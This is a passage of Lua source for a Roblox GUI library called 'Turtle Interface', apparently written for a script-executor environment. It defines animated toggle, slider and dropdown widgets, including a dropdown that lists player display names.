			TweenService:Create(ToggleTitle,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out,0,false,0),{Position = UDim2.new(0.0358126722,0,-0.160,0)}):Play()
			if typeof(descName) == "string" or typeof(descName) == "number" then
				ToggleDesc.Text = lib:ColorFonts(descName,TurtleFlags.DescTextStyle)
				--TweenService:Create(Toggle,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out,0,false,0),{Position = UDim2.new(0.215625003,0,0.446271926,TabLayout.AbsoluteContentSize.Y)}):Play()
				if descName ~= "" then
					TweenService:Create(ToggleTitle,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out,0,false,0),{Position = UDim2.new(0.0358126722,0,-0.160,0)}):Play()
					TweenService:Create(ToggleDesc,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextTransparency = 0}):Play()
				else
					TweenService:Create(ToggleTitle,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out,0,false,0),{Position = UDim2.new(0.0358126722,0,0,0)}):Play()
					TweenService:Create(ToggleDesc,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextTransparency = 1}):Play()
				end
			else
				task.spawn(function()
					TweenService:Create(ToggleDesc,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextTransparency = 1}):Play()
					wait(0.3)
					ToggleDesc.Text = lib:ColorFonts("Only accept A-Z, a-z & 0-9 not a " .. typeof(descName),TurtleFlags.DescTextStyle)
					TweenService:Create(ToggleDesc,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextTransparency = 0}):Play()
					wait(1)
					TweenService:Create(ToggleDesc,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextTransparency = 1}):Play()
					wait(0.3)
					ToggleDesc.Text = lib:ColorFonts(descName,TurtleFlags.DescTextStyle)
					TweenService:Create(ToggleDesc,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextTransparency = 0}):Play()
				end)
			end
		else
			TweenService:Create(ToggleTitle,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out,0,false,0),{Position = UDim2.new(0.0358126722,0,0,0)}):Play()
			TweenService:Create(ToggleDesc,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextTransparency = 1}):Play()
		end
	    end

	    TurtleFlags[text .. " value"] = function()
		return toggled
	    end
			
	    TurtleFlags[text .. " desc"](descToggle)
            FrameToggle1.Name = "FrameToggle1"
            FrameToggle1.Parent = Toggle
            FrameToggle1.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
            FrameToggle1.Position = UDim2.new(0.859504104, 0, 0.285714298, 0)
            FrameToggle1.Size = UDim2.new(0, 37, 0, 18)

            FrameToggle1Corner.Name = "FrameToggle1Corner"
            FrameToggle1Corner.Parent = FrameToggle1

            FrameToggle2.Name = "FrameToggle2"
            FrameToggle2.Parent = FrameToggle1
            FrameToggle2.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
            FrameToggle2.Position = UDim2.new(0.0489999987, 0, 0.0930000022, 0)
            FrameToggle2.Size = UDim2.new(0, 33, 0, 14)

            FrameToggle2Corner.Name = "FrameToggle2Corner"
            FrameToggle2Corner.Parent = FrameToggle2

            FrameToggle3.Name = "FrameToggle3"
            FrameToggle3.Parent = FrameToggle1
            FrameToggle3.BackgroundColor3 = PresetColor
            FrameToggle3.BackgroundTransparency = 1.000
            FrameToggle3.Size = UDim2.new(0, 37, 0, 18)

            FrameToggle3Corner.Name = "FrameToggle3Corner"
            FrameToggle3Corner.Parent = FrameToggle3

            FrameToggleCircle.Name = "FrameToggleCircle"
            FrameToggleCircle.Parent = FrameToggle1
            FrameToggleCircle.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
            FrameToggleCircle.Position = UDim2.new(0.127000004, 0, 0.222000003, 0)
            FrameToggleCircle.Size = UDim2.new(0, 10, 0, 10)

            FrameToggleCircleCorner.Name = "FrameToggleCircleCorner"
            FrameToggleCircleCorner.Parent = FrameToggleCircle

            --[[coroutine.wrap(
                function()
                    while wait() do
                        FrameToggle3.BackgroundColor3 = PresetColor
                    end
                end
            )()]]

	    task.spawn(function()
		if default == true then
			lib:ErrorReader(function()
				callback(true)
			end)
		end
	    end)
			
            Toggle.MouseButton1Click:Connect(function()
                    if toggled == false then
                        TweenService:Create(
                            Toggle,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {BackgroundColor3 = Color3.fromRGB(37, 37, 37)}
                        ):Play()
                        TweenService:Create(
                            FrameToggle1,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {BackgroundTransparency = 1}
                        ):Play()
                        TweenService:Create(
                            FrameToggle2,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {BackgroundTransparency = 1}
                        ):Play()
                        TweenService:Create(
                            FrameToggle3,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {BackgroundTransparency = 0}
                        ):Play()
                        TweenService:Create(
                            FrameToggleCircle,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {BackgroundColor3 = Color3.fromRGB(255, 255, 255)}
                        ):Play()
                        FrameToggleCircle:TweenPosition(
                            UDim2.new(0.587, 0, 0.222000003, 0),
                            Enum.EasingDirection.Out,
                            Enum.EasingStyle.Quart,
                            .2,
                            true
                        )
                    else
                        TweenService:Create(
                            Toggle,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {BackgroundColor3 = Color3.fromRGB(34, 34, 34)}
                        ):Play()
                        TweenService:Create(
                            FrameToggle1,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {BackgroundTransparency = 0}
                        ):Play()
                        TweenService:Create(
                            FrameToggle2,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {BackgroundTransparency = 0}
                        ):Play()
                        TweenService:Create(
                            FrameToggle3,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {BackgroundTransparency = 1}
                        ):Play()
                        TweenService:Create(
                            FrameToggleCircle,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {BackgroundColor3 = Color3.fromRGB(50, 50, 50)}
                        ):Play()
                        FrameToggleCircle:TweenPosition(
                            UDim2.new(0.127000004, 0, 0.222000003, 0),
                            Enum.EasingDirection.Out,
                            Enum.EasingStyle.Quart,
                            .2,
                            true
                        )
                    end
                    toggled = not toggled
			task.spawn(function()
				if server.dc == true then
					dcfunc()
				else
					lib:ErrorReader(function()
						callback(toggled)
					end)
				end
			end)
                end
            )

            if default == true then
                TweenService:Create(
                    Toggle,
                    TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                    {BackgroundColor3 = Color3.fromRGB(37, 37, 37)}
                ):Play()
                TweenService:Create(
                    FrameToggle1,
                    TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                    {BackgroundTransparency = 1}
                ):Play()
                TweenService:Create(
                    FrameToggle2,
                    TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                    {BackgroundTransparency = 1}
                ):Play()
                TweenService:Create(
                    FrameToggle3,
                    TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                    {BackgroundTransparency = 0}
                ):Play()
                TweenService:Create(
                    FrameToggleCircle,
                    TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                    {BackgroundColor3 = Color3.fromRGB(255, 255, 255)}
                ):Play()
                FrameToggleCircle:TweenPosition(
                    UDim2.new(0.587, 0, 0.222000003, 0),
                    Enum.EasingDirection.Out,
                    Enum.EasingStyle.Quart,
                    .2,
                    true
                )
                toggled = not toggled
            end

		function asslabel:EditText(str)
			ToggleTitle.Text = str
		end

		function asslabel:GetValue()
			return toggled
		end

		function asslabel:ClearCache()
			Toggle:TweenSize(UDim2.new(0,0,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,.6,true,function()
				Toggle:Destroy()
			end)
			Tab.CanvasSize = UDim2.new(0,0,0,TabLayout.AbsoluteContentSize.Y)
		end
			
		function asslabel:Set(str)
			toggled = str
			if toggled == true then
				TweenService:Create(Toggle,TweenInfo.new(.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{BackgroundColor3 = Color3.fromRGB(37,37,37)}):Play()
                                 TweenService:Create(FrameToggle1,TweenInfo.new(.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{BackgroundTransparency = 1}):Play()
                                 TweenService:Create(FrameToggle2,TweenInfo.new(.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{BackgroundTransparency = 1}):Play()
                                 TweenService:Create(FrameToggle3,TweenInfo.new(.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{BackgroundTransparency = 0}):Play()
                                 TweenService:Create(FrameToggleCircle,TweenInfo.new(.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{BackgroundColor3 = Color3.fromRGB(255, 255, 255)}):Play()
                                 FrameToggleCircle:TweenPosition(UDim2.new(0.587,0,0.222000003,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,.2,true)
			elseif toggled == false then
                                 TweenService:Create(Toggle,TweenInfo.new(.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{BackgroundColor3 = Color3.fromRGB(34, 34, 34)}):Play()
                                 TweenService:Create(FrameToggle1,TweenInfo.new(.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{BackgroundTransparency = 0}):Play()
                                 TweenService:Create(FrameToggle2,TweenInfo.new(.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{BackgroundTransparency = 0}):Play()
                                 TweenService:Create(FrameToggle3,TweenInfo.new(.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{BackgroundTransparency = 1}):Play()
                                 TweenService:Create(FrameToggleCircle,TweenInfo.new(.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{BackgroundColor3 = Color3.fromRGB(50, 50, 50)}):Play()
                                 FrameToggleCircle:TweenPosition(UDim2.new(0.127000004,0,0.222000003,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,.2,true)
			end
			lib:ErrorReader(function()
				callback(toggled)
			end)
		end

		TurtleFlags[text .. " UI"] = Toggle
		TurtleFlags[text .. " • Turtle Interface"] = function(str)
			toggled = str
			if toggled == true then
				TweenService:Create(Toggle,TweenInfo.new(.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{BackgroundColor3 = Color3.fromRGB(37,37,37)}):Play()
                                 TweenService:Create(FrameToggle1,TweenInfo.new(.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{BackgroundTransparency = 1}):Play()
                                 TweenService:Create(FrameToggle2,TweenInfo.new(.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{BackgroundTransparency = 1}):Play()
                                 TweenService:Create(FrameToggle3,TweenInfo.new(.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{BackgroundTransparency = 0}):Play()
                                 TweenService:Create(FrameToggleCircle,TweenInfo.new(.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{BackgroundColor3 = Color3.fromRGB(255, 255, 255)}):Play()
                                 FrameToggleCircle:TweenPosition(UDim2.new(0.587,0,0.222000003,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,.2,true)
			elseif toggled == false then
                                 TweenService:Create(Toggle,TweenInfo.new(.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{BackgroundColor3 = Color3.fromRGB(34, 34, 34)}):Play()
                                 TweenService:Create(FrameToggle1,TweenInfo.new(.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{BackgroundTransparency = 0}):Play()
                                 TweenService:Create(FrameToggle2,TweenInfo.new(.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{BackgroundTransparency = 0}):Play()
                                 TweenService:Create(FrameToggle3,TweenInfo.new(.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{BackgroundTransparency = 1}):Play()
                                 TweenService:Create(FrameToggleCircle,TweenInfo.new(.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{BackgroundColor3 = Color3.fromRGB(50, 50, 50)}):Play()
                                 FrameToggleCircle:TweenPosition(UDim2.new(0.127000004,0,0.222000003,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,.2,true)
			end
			lib:ErrorReader(function()
				callback(toggled)
			end)
		end
		--TurtleFlags[text .. " • Turtle Interface"] = Set
            Tab.CanvasSize = UDim2.new(0,0,0,TabLayout.AbsoluteContentSize.Y)
	    return asslabel
        end
		
        function tabcontent:Slider(text, min, max, start, callback)
            local dragging = false
            local Slider = Instance.new("TextButton")
            local SliderCorner = Instance.new("UICorner")
            local SliderTitle = Instance.new("TextLabel")
            local SliderValue = Instance.new("TextLabel")
            local SlideFrame = Instance.new("Frame")
            local CurrentValueFrame = Instance.new("Frame")
            local SlideCircle = Instance.new("ImageButton")
	    local tblFeature = {}
			
            Slider.Name = "Slider"
            Slider.Parent = Tab
            Slider.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
            Slider.Position = UDim2.new(-0.48035714, 0, -0.570532918, 0)
            Slider.Size = UDim2.new(0, 363, 0, 60)
            Slider.AutoButtonColor = false
            Slider.Font = Enum.Font.SourceSans
            Slider.Text = ""
            Slider.TextColor3 = Color3.fromRGB(0, 0, 0)
            Slider.TextSize = 14.000

            SliderCorner.CornerRadius = UDim.new(0, 5)
            SliderCorner.Name = "SliderCorner"
            SliderCorner.Parent = Slider

            SliderTitle.Name = "SliderTitle"
            SliderTitle.Parent = Slider
            SliderTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            SliderTitle.BackgroundTransparency = 1.000
            SliderTitle.Position = UDim2.new(0.0358126722, 0, 0, 0)
            SliderTitle.Size = UDim2.new(0, 187, 0, 42)
            SliderTitle.Font = Enum.Font.Gotham
            SliderTitle.Text = text
            SliderTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
            SliderTitle.TextSize = 14.000
            SliderTitle.TextXAlignment = Enum.TextXAlignment.Left
            SliderTitle.RichText = true
			
            SliderValue.Name = "SliderValue"
            SliderValue.Parent = Slider
            SliderValue.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            SliderValue.BackgroundTransparency = 1.000
            SliderValue.Position = UDim2.new(0.0358126722, 0, 0, 0)
            SliderValue.Size = UDim2.new(0, 335, 0, 42)
            SliderValue.Font = Enum.Font.Gotham
            SliderValue.Text = tostring(start and math.floor((start / max) * (max - min) + min) or 0)
            SliderValue.TextColor3 = Color3.fromRGB(255, 255, 255)
            SliderValue.TextSize = 14.000
            SliderValue.TextXAlignment = Enum.TextXAlignment.Right

            SlideFrame.Name = "SlideFrame"
            SlideFrame.Parent = Slider
            SlideFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
            SlideFrame.BorderSizePixel = 0
            SlideFrame.Position = UDim2.new(0.0342647657, 0, 0.686091602, 0)
            SlideFrame.Size = UDim2.new(0, 335, 0, 3)

            CurrentValueFrame.Name = "CurrentValueFrame"
            CurrentValueFrame.Parent = SlideFrame
            CurrentValueFrame.BackgroundColor3 = PresetColor
            CurrentValueFrame.BorderSizePixel = 0
            CurrentValueFrame.Size = UDim2.new((start or 0) / max, 0, 0, 3)

            SlideCircle.Name = "SlideCircle"
            SlideCircle.Parent = SlideFrame
            SlideCircle.BackgroundColor3 = PresetColor
            SlideCircle.BackgroundTransparency = 1.000
            SlideCircle.Position = UDim2.new((start or 0) / max, -6, -1.30499995, 0)
            SlideCircle.Size = UDim2.new(0, 11, 0, 11)
            SlideCircle.Image = "rbxassetid://3570695787"
            SlideCircle.ImageColor3 = PresetColor

            coroutine.wrap(
                function()
                    while wait() do
                        CurrentValueFrame.BackgroundColor3 = PresetColor
                        SlideCircle.ImageColor3 = PresetColor
                    end
                end
            )()

	    pcall(callback,start)
	    local function move(input)
                local pos =
                    UDim2.new(
                    math.clamp((input.X - SlideFrame.AbsolutePosition.X) / SlideFrame.AbsoluteSize.X, 0, 1),
                    -6,
                    -1.30499995,
                    0
                )
                local pos1 =
                    UDim2.new(
                    math.clamp((input.X - SlideFrame.AbsolutePosition.X) / SlideFrame.AbsoluteSize.X, 0, 1),
                    0,
                    0,
                    3
                )
                CurrentValueFrame:TweenSize(pos1,"Out","Sine",0.1,true)
                SlideCircle:TweenPosition(pos,"Out","Sine",0.1,true)
                local value = math.floor(((pos.X.Scale * max) / max) * (max - min) + min)
                SliderValue.Text = tostring(value)
                pcall(callback,value)
            end

	    function tblFeature.SetValue(input)
		if typeof(input) == "Vector3" then
			move(input)
		else
			lib:notify(lib:ColorFonts("Value must be a Vector3Value. Expected Vector3Value, got " .. typeof(input),"Bold,Red"),10)
			return 
		end
	    end

	    function tblFeature.isReachedMaxValue()
		if tonumber(SliderValue.Text) == max then
			return true
		end
		return false
	    end
			
            SlideCircle.InputBegan:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                    dragging = true
                end
            end)
			
            SlideCircle.InputEnded:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		    dragging = false
                end
            end)
			
            SlideCircle.InputChanged:Connect(function(input)
                if dragging and input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		    move(input.Position)
                end
            end) -- end

	    SlideFrame.InputBegan:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                    dragging = true
                end
            end)
			
            SlideFrame.InputEnded:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		    dragging = false
                end
            end)
			
            SlideFrame.InputChanged:Connect(function(input)
                if dragging and input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		    move(input.Position)
                end
            end) -- end

	    Slider.InputBegan:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                    dragging = true
                end
            end)
			
            Slider.InputEnded:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		    dragging = false
                end
            end)
			
            Slider.InputChanged:Connect(function(input)
                if dragging and input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		    move(input.Position)
                end
            end) -- end
            Tab.CanvasSize = UDim2.new(0, 0, 0, TabLayout.AbsoluteContentSize.Y)
	    return tblFeature
        end
        function tabcontent:Dropdown(text,list,callback,descToggle)
            local droptog = false
            local framesize = 0
            local itemcount = 0
            local ahhts = {}
	    local randomSelectedValueOption = list
			
            local Dropdown = Instance.new("Frame")
            local DropdownCorner = Instance.new("UICorner")
            local DropdownBtn = Instance.new("TextButton")
            local DropdownTitle = Instance.new("TextLabel")
            local ArrowImg = Instance.new("ImageLabel")
            local DropItemHolder = Instance.new("ScrollingFrame")
            local DropLayout = Instance.new("UIListLayout")

            Dropdown.Name = "Dropdown"
            Dropdown.Parent = Tab
            Dropdown.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
            Dropdown.ClipsDescendants = true
            Dropdown.Position = UDim2.new(-0.541071415, 0, -0.532915354, 0)
            Dropdown.Size = UDim2.new(0, 363, 0, 42)

            DropdownCorner.CornerRadius = UDim.new(0, 5)
            DropdownCorner.Name = "DropdownCorner"
            DropdownCorner.Parent = Dropdown

            DropdownBtn.Name = "DropdownBtn"
            DropdownBtn.Parent = Dropdown
            DropdownBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            DropdownBtn.BackgroundTransparency = 1.000
            DropdownBtn.Size = UDim2.new(0, 363, 0, 42)
            DropdownBtn.Font = Enum.Font.SourceSans
            DropdownBtn.Text = ""
            DropdownBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
            DropdownBtn.TextSize = 14.000

            DropdownTitle.Name = "DropdownTitle"
            DropdownTitle.Parent = Dropdown
            DropdownTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            DropdownTitle.BackgroundTransparency = 1.000
            DropdownTitle.Position = UDim2.new(0.0358126722, 0, 0, 0)
            DropdownTitle.Size = UDim2.new(0, 187, 0, 42)
            DropdownTitle.Font = Enum.Font.Gotham
            DropdownTitle.Text = text
            DropdownTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
            DropdownTitle.TextSize = 14.000
            DropdownTitle.TextXAlignment = Enum.TextXAlignment.Left
            DropdownTitle.RichText = true
			
            local ToggleDesc = Instance.new("TextLabel")
	    ToggleDesc.Name = "DropdownDesc"
            ToggleDesc.Parent = Dropdown
            ToggleDesc.BackgroundColor3 = Color3.fromRGB(255,255,255)
            ToggleDesc.BackgroundTransparency = 1.000
            ToggleDesc.Position = UDim2.new(0.0358126722,0,0.160,0)
            ToggleDesc.Size = UDim2.new(0,187,0,42)
            ToggleDesc.Font = Enum.Font.Gotham
            ToggleDesc.Text = ""
            ToggleDesc.TextColor3 = Color3.fromRGB(255, 255, 255)
            ToggleDesc.TextSize = 12.000
            ToggleDesc.TextXAlignment = Enum.TextXAlignment.Left
            ToggleDesc.RichText = true
	    ToggleDesc.Visible = false

	    ArrowImg.Name = "ArrowImg"
            ArrowImg.Parent = DropdownTitle
            ArrowImg.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            ArrowImg.BackgroundTransparency = 1.000
            ArrowImg.Position = UDim2.new(1.65240645, 0, 0.190476194, 0)
            ArrowImg.Size = UDim2.new(0, 26, 0, 26)
            ArrowImg.Image = "http://www.roblox.com/asset/?id=6034818375"

            DropItemHolder.Name = "DropItemHolder"
            DropItemHolder.Parent = DropdownTitle
            DropItemHolder.Active = true
            DropItemHolder.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            DropItemHolder.BackgroundTransparency = 1.000
            DropItemHolder.BorderSizePixel = 0
            DropItemHolder.Position = UDim2.new(-0.00400000019, 0, 1.04999995, 0)
            DropItemHolder.Size = UDim2.new(0, 342, 0, 0)
            DropItemHolder.CanvasSize = UDim2.new(0, 0, 0, 0)
            DropItemHolder.ScrollBarThickness = 3

            DropLayout.Name = "DropLayout"
            DropLayout.Parent = DropItemHolder
            DropLayout.SortOrder = Enum.SortOrder.LayoutOrder

            DropdownBtn.MouseButton1Click:Connect(function()
                    if droptog == false then
                        Dropdown:TweenSize(
                            UDim2.new(0, 363, 0, 55 + framesize),
                            Enum.EasingDirection.Out,
                            Enum.EasingStyle.Quart,
                            .2,
                            true
                        )
                        TweenService:Create(
                            ArrowImg,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {Rotation = 270}
                        ):Play()
                        wait(.2)
                        Tab.CanvasSize = UDim2.new(0, 0, 0, TabLayout.AbsoluteContentSize.Y)
                    else
                        Dropdown:TweenSize(
                            UDim2.new(0, 363, 0, 42),
                            Enum.EasingDirection.Out,
                            Enum.EasingStyle.Quart,
                            .2,
                            true
                        )
                        TweenService:Create(
                            ArrowImg,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {Rotation = 0}
                        ):Play()
                        wait(.2)
                        Tab.CanvasSize = UDim2.new(0, 0, 0, TabLayout.AbsoluteContentSize.Y)
                    end
                    droptog = not droptog
                end)

	    pcall(callback,list[1])
	    DropdownTitle.Text = text .. " - " .. list[1]
            for i,v in next,list do
                itemcount = itemcount + 1
                if itemcount <= 3 then
                    framesize = framesize + 26
                    DropItemHolder.Size = UDim2.new(0,342,0,framesize)
                end
                local Item = Instance.new("TextButton")
                local ItemCorner = Instance.new("UICorner")

                Item.Name = "Item"
                Item.Parent = DropItemHolder
                Item.BackgroundColor3 = Color3.fromRGB(34,34,34)
                Item.ClipsDescendants = true
                Item.Size = UDim2.new(0,335,0,25)
                Item.AutoButtonColor = false
                Item.Font = Enum.Font.Gotham
                Item.Text = v
                Item.TextColor3 = Color3.fromRGB(255,255,255)
                Item.TextSize = 15.000
                Item.RichText = true
				
                ItemCorner.CornerRadius = UDim.new(0, 4)
                ItemCorner.Name = "ItemCorner"
                ItemCorner.Parent = Item

                Item.MouseEnter:Connect(function()
                        TweenService:Create(Item,TweenInfo.new(.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{BackgroundColor3 = Color3.fromRGB(37,37,37)}):Play()
                end)

                Item.MouseLeave:Connect(function()
                        TweenService:Create(Item,TweenInfo.new(.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{BackgroundColor3 = Color3.fromRGB(34,34,34)}):Play()
                end)

                Item.MouseButton1Click:Connect(function()
                        droptog = not droptog
                        DropdownTitle.Text = text .. " - " .. v
                        pcall(callback,v)
                        Dropdown:TweenSize(UDim2.new(0,363,0,42),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,.2,true)
                        TweenService:Create(ArrowImg,TweenInfo.new(.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{Rotation = 0}):Play()
                        wait(.2)
                        Tab.CanvasSize = UDim2.new(0,0,0,TabLayout.AbsoluteContentSize.Y)
                    end)

                DropItemHolder.CanvasSize = UDim2.new(0,0,0,DropLayout.AbsoluteContentSize.Y)
            end


		function ahhts.ClearItem(value)
			if typeof(value) == "string" then
				lib:children(DropItemHolder,function(v)
					if v:IsA("TextButton") and v.Text == value then
						for i,v in pairs(getconnections(v["MouseEnter"])) do
							v:Disconnect()
						end
						for i,v in pairs(getconnections(v["MouseLeave"])) do
							v:Disconnect()
						end
						for i,v in pairs(getconnections(v["MouseButton1Click"])) do
							v:Disconnect()
						end
						wait(0.5)
					        table.remove(randomSelectedValueOption,table.find(randomSelectedValueOption,value))
						v:Destroy()
					end
				end)
			end
		end

		local function addItems(name)
			itemcount = itemcount + 1
                	if itemcount <= 3 then
                		framesize = framesize + 26
                    		DropItemHolder.Size = UDim2.new(0,342,0,framesize)
                	end
                	local Item = Instance.new("TextButton")
               	 	local ItemCorner = Instance.new("UICorner")

                	Item.Name = "Item"
                	Item.Parent = DropItemHolder
               	 	Item.BackgroundColor3 = Color3.fromRGB(34,34,34)
                	Item.ClipsDescendants = true
                	Item.Size = UDim2.new(0,335,0,25)
                	Item.AutoButtonColor = false
                	Item.Font = Enum.Font.Gotham
                	Item.Text = name
                	Item.TextColor3 = Color3.fromRGB(255,255,255)
                	Item.TextSize = 15.000
                	Item.RichText = true
				
                	ItemCorner.CornerRadius = UDim.new(0,4)
                	ItemCorner.Name = "ItemCorner"
                	ItemCorner.Parent = Item

               	 	Item.MouseEnter:Connect(function()
                        	TweenService:Create(Item,TweenInfo.new(.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{BackgroundColor3 = Color3.fromRGB(37,37,37)}):Play()
                	end)

                	Item.MouseLeave:Connect(function()
                        	TweenService:Create(Item,TweenInfo.new(.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{BackgroundColor3 = Color3.fromRGB(34,34,34)}):Play()
                	end)

                	Item.MouseButton1Click:Connect(function()
                        	droptog = not droptog
                        	DropdownTitle.Text = text .. " - " .. name
                        	pcall(callback,name)
                        	Dropdown:TweenSize(UDim2.new(0,363,0,42),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,.2,true)
                        	TweenService:Create(ArrowImg,TweenInfo.new(.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{Rotation = 0}):Play()
                        	wait(.2)
                        	Tab.CanvasSize = UDim2.new(0,0,0,TabLayout.AbsoluteContentSize.Y)
                    	end)

                	DropItemHolder.CanvasSize = UDim2.new(0,0,0,DropLayout.AbsoluteContentSize.Y)
		end
			
		function ahhts.AsyncOptions(value,opt) --randomSelectedValueOption = 
			if typeof(value) == "string" then
				if value == "manual add" then
					lib:AddTable(opt,randomSelectedValueOption)
					addItems(opt)
				elseif value == "players" then
					lib:GetPlayer(function(v)
						lib:AddTable(v.DisplayName,randomSelectedValueOption)
						addItems(v.DisplayName)
					end)
					lib.onPlayerJoin(function(v)
						lib:AddTable(v.DisplayName,randomSelectedValueOption)
						addItems(v.DisplayName)
					end)
					lib.onPlayerLeft(function(plr)
						table.remove(randomSelectedValueOption,table.find(randomSelectedValueOption,plr.DisplayName))
						--local randomValueAtChanged = randomSelectedValueOption[math.random(1,#randomSelectedValueOption)]
						--DropdownTitle.Text = text .. " - " .. randomValueAtChanged
                        			--pcall(callback,randomValueAtChanged)
						lib:children(DropItemHolder,function(v)
							if v:IsA("TextButton") and v.Text == plr.DisplayName then
								for i,v in pairs(getconnections(v["MouseEnter"])) do
									v:Disconnect()
								end
								for i,v in pairs(getconnections(v["MouseLeave"])) do
									v:Disconnect()
								end
								for i,v in pairs(getconnections(v["MouseButton1Click"])) do
									v:Disconnect()
								end
								v:Destroy()
								wait(0.5)
								DropItemHolder.CanvasSize = UDim2.new(0,0,0,DropLayout.AbsoluteContentSize.Y)
							end
						end)
					end)
				elseif value == "select" then
					if opt == randomSelectedValueOption[table.find(randomSelectedValueOption,opt)] then
						DropdownTitle.Text = text .. " - " .. randomSelectedValueOption[table.find(randomSelectedValueOption,opt)]
